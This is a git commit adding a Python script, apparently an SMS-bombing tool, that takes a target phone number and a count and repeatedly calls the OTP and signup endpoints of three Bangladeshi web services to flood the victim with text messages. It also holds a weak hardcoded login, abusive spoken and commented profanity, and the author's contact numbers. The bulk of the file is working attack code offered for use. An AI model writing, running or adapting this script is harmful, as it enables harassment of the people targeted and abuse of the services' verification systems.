b01dda7c3658f45d334d552e03bf54a598f09be7
SIAM-CYBER <134132313+Siam9p@users.noreply.github.com>
2023-07-10 20:22:59 +0600

    Add files via upload

---
+++ BOMPING.py
@@ -0,0 +1,157 @@
+from getpass import getpass
+
+user ="siam"
+pas ="siam"
+
+print("login")
+
+username = input("Please Enter Your Username ==>")
+password = getpass("Please Enter Your Password ==>")
+
+
+if username==user :
+	print("Thanks Using This Tool")
+	
+if pas==password :
+	print("you are login successfully ")
+	
+else :
+	print("Please try again")
+	os.system(exit)
+import os
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] SIAM CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS SIAM CYBER KING SIAM\033[1;30m")
+os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH SIAM CYBER KING OFF SIAM WORLD"')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://www.facebook.com/groups/2740586426083467/permalink/2740592186082891/")
+logo3=("""
+   /$$$$$$  /$$                        
+ /$$__  $$|__/                        
+| $$  \__/ /$$  /$$$$$$  /$$$$$$/$$$$ 
+|  $$$$$$ | $$ |____  $$| $$_  $$_  $$
+ \____  $$| $$  /$$$$$$$| $$ \ $$ \ $$
+ /$$  \ $$| $$ /$$__  $$| $$ | $$ | $$
+|  $$$$$$/| $$|  $$$$$$$| $$ | $$ | $$
+ \______/ |__/ \_______/|__/ |__/ |__/
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSIAM     HK         \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[S]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46mEjaj Khan Siam       \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[I]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟗𝟓𝟒𝟗𝟖𝟓𝟕     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[A]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSIAM 𝐂𝐘𝐁𝐄𝐑 𝟗𝟗𝟒𝟖𝟕 \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[M]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01309132215     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[H]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46m00000000000.......       \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
+os.system('espeak -a 300 "author eks siam "')
+os.system('espeak -a 300 "Facebook  ejaj khan siam "')
+os.system('espeak -a 300 "whathapp 0 1 3 0 9 1 3 2 2 1 5 "')
+os.system('espeak -a 300 "github siam cyber 9 9 4 8 7 "')
+os.system('espeak -a 300 "telegram 0 1 3 0 9 1 3 2 2 1 5 "')
+os.system('espeak -a 300 "imo 0 1 3 0 9 1 3 2 2 1 5 "')
+os.system('espeak -a 300 "from Bangladesh "')
+os.system('espeak -a 300 " i fuck you men mother sode"')
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗦𝗜𝗔𝗠𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗦𝗜𝗔𝗠𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗦𝗜𝗔𝗠𝄟⃝  SMS WAS SENT🐼")
+    
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+\x1b[38;5;196m SEN🐼        
+\033[34;1m$$$$$$$$\ $$\   $$\  $$$$$$\  
+\033[34;1m$$  _____|$$ | $$  |$$  __$$\ 
+\033[34;1m$$ |      $$ |$$  / $$ /  \__|
+\033[34;1m$$$$$\    $$$$$  /  \$$$$$$\  
+\033[34;1m$$  __|   $$  $$<    \____$$\ 
+\033[34;1m$$ |      $$ |\$$\  $$\   $$ |
+\033[34;1m$$$$$$$$\ $$ | \$$\ \$$$$$$  |
+\033[34;1m\________|\__|  \__| \______/ 
+
+\033[31;1m$$$$$$\  $$$$$$\  $$$$$$\  $$\      $$\ 
+\033[31;1m$$  __$$\ \_$$  _|$$  __$$\ $$$\    $$$ |
+\033[31;1m$$ /  \__|  $$ |  $$ /  $$ |$$$$\  $$$$ |
+\033[31;1m\$$$$$$\    $$ |  $$$$$$$$ |$$\$$\$$ $$ |
+\033[31;1m\____$$\   $$ |  $$  __$$ |$$ \$$$  $$ |
+\033[31;1m$$\   $$ |  $$ |  $$ |  $$ |$$ |\$  /$$ |
+\033[31;1m\$$$$$$  |$$$$$$\ $$ |  $$ |$$ | \_/ $$ |
+\033[31;1m\______/ \______|\__|  \__|\__|     \__|
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSIAM     HK         \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[S]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46mEjaj Khan Siam       \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[I]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟗𝟓𝟒𝟗𝟖𝟓𝟕     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[A]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSIAM 𝐂𝐘𝐁𝐄𝐑 𝟗𝟗𝟒𝟖𝟕 \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[M]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01309132215     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[H]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m║\033[38;5;46m00000000000.......       \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SIAM𝄟⃝  \x1b[38;5;196m╚══════════════════╝
+      \033[38;5;46m____  ____  _  ________
+     \033[38;5;46m/ __ \/ __ \/ | / / ____/
+    \033[38;5;46m/ / / / / / /  |/ / __/   
+   \033[38;5;46m/ /_/ / /_/ / /|  / /___   
+  \033[38;5;46m/_____/\____/_/ |_/_____/   
+                            
+ TNQ FOR USING OUR TOOLS 🖤
+""")
+#madarcod ase geli script curi korte 🙂
+#bancod tk khoroc kore nijeo to sikhte paros
